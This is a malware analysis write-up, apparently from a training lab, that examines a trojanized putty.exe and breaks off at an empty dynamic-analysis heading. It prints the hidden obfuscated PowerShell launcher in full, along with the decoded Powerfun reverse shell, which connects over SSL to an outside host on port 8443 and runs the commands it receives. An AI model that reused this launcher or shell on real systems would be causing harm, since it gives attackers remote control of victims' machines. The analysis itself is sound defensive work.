# putty.exe

## Identification:

**FileName:** putty.exe

**SHA256:** 0C82E654C09C8FD9FDF4899718EFA37670974C9EEC5A8FC18A167F93CEA6EE83

**FileSize:** 1548288 (bytes)

<br>

## Analysis:

### Static Analysis

For the initial triage, the sample was loaded in PEStudio as shown below.

<image src="../Images/putty.exe1.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

Followings were found:
- The entropy of this sample was high (7.394 out of 8) so it could be packed.
- The sampole is 32-bit and has GUI interface.
- The sample was compiled on Sat Jul 10 02:51:55 2021.

To verify more on if its packed, the virtual size and raw size of the .text sections of this sample were checked and was found to be similar as shown below. 

<image src="../Images/putty.exe2.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

The entropy may be high because of the compiler used in compiling the putty.

<br>

Then the strings were checked using the FLOSS tool with the command:

`floss.exe putty.exe`

There were many strings that were of legitimate putty. But one string was very suspicious which is shown below.

    powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"

The above string is Base64 encoded and Gzipped which is passed into powershell. Using cyberchef the above contents were decoded as shown below. 

<image src="../Images/putty.exe3.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

The decoded content is shown below which seems to be a reverse shell to bonus2.corporatebonusapplication.local over port 8443. Also the reverse shell seems to use SSL during communication. 

    # Powerfun - Written by Ben Turner & Dave Hardy
    
    function Get-Webclient 
    {
        $wc = New-Object -TypeName Net.WebClient
        $wc.UseDefaultCredentials = $true
        $wc.Proxy.Credentials = $wc.Credentials
        $wc
    }
    function powerfun 
    { 
        Param( 
        [String]$Command,
        [String]$Sslcon,
        [String]$Download
        ) 
        Process {
        $modules = @()  
        if ($Command -eq "bind")
        {
            $listener = [System.Net.Sockets.TcpListener]8443
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 
        if ($Command -eq "reverse")
        {
            $client = New-Object System.Net.Sockets.TCPClient("bonus2.corporatebonusapplication.local",8443)
        }
    
        $stream = $client.GetStream()
    
        if ($Sslcon -eq "true") 
        {
            $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
            $sslStream.AuthenticateAsClient("bonus2.corporatebonusapplication.local") 
            $stream = $sslStream 
        }
    
        [byte[]]$bytes = 0..20000|%{0}
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)
    
        if ($Download -eq "true")
        {
            $sendbytes = ([text.encoding]::ASCII).GetBytes("[+] Loading modules.`n")
            $stream.Write($sendbytes,0,$sendbytes.Length)
            ForEach ($module in $modules)
            {
                (Get-Webclient).DownloadString($module)|Invoke-Expression
            }
        }
    
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)
    
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
    
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x
    
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        $listener.Stop()
        }
    }
    
    powerfun -Command reverse -Sslcon true

This proves that the putty is trojanized as RAT. Let verify more by dynamically analyzing it in the next section.

<br>

### Dynamic Analysis:


